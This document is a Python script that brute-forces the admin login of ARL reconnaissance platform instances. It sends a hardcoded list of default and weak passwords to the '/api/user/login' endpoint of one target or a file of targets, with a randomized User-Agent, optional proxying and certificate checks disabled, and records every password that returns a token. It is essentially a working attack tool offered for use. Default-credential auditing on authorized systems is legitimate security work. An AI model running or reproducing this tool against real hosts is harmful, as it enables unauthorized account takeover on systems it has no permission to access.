from fake_useragent import UserAgent
import requests
import argparse
import re
import urllib3
from colorama import Fore, Style
from enum import Enum

#  全局变量
proxies = {}
outfile = "result.txt"
passwords = [
    "arlpass",
    "admin",
    "Admin",
    "admin123",
    "123456",
    "1qaz@WSX"
]

hit = []

# 禁用证书验证警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def InitParser():
    parser = argparse.ArgumentParser()  # 获取解析器
    # 从文件中读取URL  或者  指定URL, 需要使用到add_mutually_exclusive_group模块
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", type=str, help=f"Target URL ")
    group.add_argument("-f", "--file", type=str, help=f"Target File")
    parser.add_argument("--proxy", type=str, help=f"Set Proxy")
    parser.add_argument("-o", "--outfile", type=str, help="Default outfile is result.txt, or use -o to set file path")
    return parser


def log(outfile, msg):
    # 日志保存到文件
    with open(outfile, "a", encoding="utf-8") as file:
        file.write(msg)


class PrintColor:
    @staticmethod
    def RED(msg):
        return f"{Fore.RED}{msg}{Style.RESET_ALL}"

    @staticmethod
    def BLUE(msg):
        return f"{Fore.BLUE}{msg}{Style.RESET_ALL}"

    @staticmethod
    def YELLOW(msg):
        return f"{Fore.YELLOW}{msg}{Style.RESET_ALL}"


def DoRequest(url):
    global hit
    # 构造数据包
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Content-Type": "application/json; charset=UTF-8"
    }
    api = '/api/user/login'
    # 我这里指定协议是https, 这里有个坑点, 只有https协议好像才可以发送http/2的数据包
    url_res = url
    url = "https://" + url + api

    # 默认返回信息
    msg = f"【info】目标 {url} 未爆破出结果"

    for password in passwords:
        data = {
            "username": "admin",
            "password": password
        }
        # 发送请求
        try:
            http_res = requests.post(url=url, headers=headers, json=data, proxies=proxies, verify=False, timeout=5)
        except Exception as e:
            print(e)
            msg = f"【info】 {url} 请求异常"
            print(PrintColor.YELLOW(msg))
            return msg
        res = re.search("\"token\": \"(.*?)\"", http_res.text)
        if http_res.status_code != 200:
            msg = f"【info】目标 {url} 请求出现异常, 请求状态码为: {http_res.status_code}"
            print(PrintColor.YELLOW(msg))
            return msg
        if res:
            hit.append(f"【{url_res}】密码: {password}")
            msg = f"【high】 {url_res} 成功发现密码: {password}"
            print(PrintColor.RED(msg))
            log(outfile, msg + "\n")
            return msg
    print(PrintColor.BLUE(msg))
    return msg


def getARL():
    # 获取输入的参数
    url = "http://127.0.0.1"
    global outfile
    global proxies
    parser = InitParser()
    args = parser.parse_args()
    if args.url:
        url = args.url
    if args.file:
        with open(args.file, "r", encoding="utf-8") as file:
            url = [line.strip("\r\n") for line in file]
            # for u in file.readlines():
            #     url = u.split()
            #     break
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    if args.outfile:
        outfile = args.outfile

    if isinstance(url, list):
        for u in url:
            res = DoRequest(u)
    else:
        res = DoRequest(url)

    print(f"\n{PrintColor.RED(res)}")
    for h in hit:
        print(f"{PrintColor.RED(h)}")


if __name__ == '__main__':
    try:
        getARL()
    except KeyboardInterrupt:
        print(f"\n{PrintColor.RED('扫描结果:')}")
        for h in hit:
            print(f"{PrintColor.RED(h)}")
